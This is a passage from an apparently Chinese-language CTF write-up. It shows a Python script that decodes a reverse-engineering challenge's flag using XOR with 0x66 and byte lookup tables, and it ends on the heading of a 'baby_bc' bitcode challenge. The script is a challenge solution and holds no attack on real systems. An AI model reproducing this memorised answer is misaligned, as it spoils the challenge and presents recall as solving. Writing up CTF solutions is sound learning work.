class="number">0xAA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xAF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBA</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBF</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xC3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC4</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xC8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC9</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xCD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCE</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xCF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD3</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xD7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD8</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xDC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDD</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xDF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE7</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xEF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFB</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x5F53055504525E54</span></span><br><span class="line">b = <span class="number">0x3025156540750</span></span><br><span class="line">c = <span class="number">0x57</span></span><br><span class="line"></span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    i = a % <span class="number">256</span></span><br><span class="line">    a //= <span class="number">256</span></span><br><span class="line">    flag_str += <span class="built_in">chr</span>(i^<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    i = b % <span class="number">256</span></span><br><span class="line">    b //= <span class="number">256</span></span><br><span class="line">    flag_str += <span class="built_in">chr</span>(i^<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">flag_str += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;W&#x27;</span>)^<span class="number">0x66</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">2</span> * f(n-<span class="number">1</span>)</span><br><span class="line">        ans = <span class="number">2</span> ** ( <span class="number">2</span> * n -<span class="number">3</span> )</span><br><span class="line">        ans += result</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">tmp = [<span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">chars = [</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xAC</span>, <span class="number">0x43</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xBE</span>, <span class="number">0xB5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xDC</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0xC4</span>, <span class="number">0x62</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0xE2</span>, <span class="number">0xAC</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x2A</span>, <span class="number">0xC9</span>, <span class="number">0xFB</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0xCD</span>, <span class="number">0x9E</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, </span><br><span class="line">  <span class="number">0x0D</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span> ; <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">8</span>:</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="built_in">sum</span> %= <span class="number">8</span></span><br><span class="line">        <span class="built_in">print</span>(flag_str[tmp[<span class="built_in">sum</span>-<span class="number">1</span>]],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">sum</span> += i * (<span class="number">256</span> ** num)</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<h3 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h3><p><code>bc</code>全称<code>bitcode</code>，是一种中间语言。资料链接如下：</p>
